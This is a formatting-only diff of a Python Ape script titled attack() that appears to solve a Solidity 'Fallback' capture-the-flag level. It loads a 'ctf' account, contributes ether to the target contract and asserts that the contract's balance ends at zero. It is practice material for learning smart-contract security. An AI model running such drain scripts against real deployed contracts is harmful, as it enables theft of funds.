@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-from ape import project, networks, accounts
+from ape import accounts, networks, project
 from scripts.deploy import deploy_fallback
 from scripts.helper_functions import get_account
 
@@ -11,17 +11,19 @@ def attack():
         fallback_contract = deploy_fallback()
         _, attacker = get_account()
     else:
-        fallback_contract = project.Fallback.at("0x77923a4Ee93e210796C65e10419faE8A6c0569e4")
+        fallback_contract = project.Fallback.at(
+            "0x77923a4Ee93e210796C65e10419faE8A6c0569e4"
+        )
         attacker = accounts.load("ctf")
-        #attacker.set_autosign(True, passphrase=unlock_password)
+        # attacker.set_autosign(True, passphrase=unlock_password)
 
-    #print(attacker.address)
-    #exit(1)
-    
-    #print(fallback_contract.address)
+    # print(attacker.address)
+    # exit(1)
+
+    # print(fallback_contract.address)
     tx = fallback_contract.contribute(sender=attacker, value="0.000001 ether")
 
-    #print(tx)
+    # print(tx)
 
     print(fallback_contract.getContribution(sender=attacker))
 
@@ -38,9 +40,9 @@ def attack():
     assert fallback_contract.balance == 0
 
 
-
 def main():
     attack()
+
 
 if __name__ == "__main__":
     main()
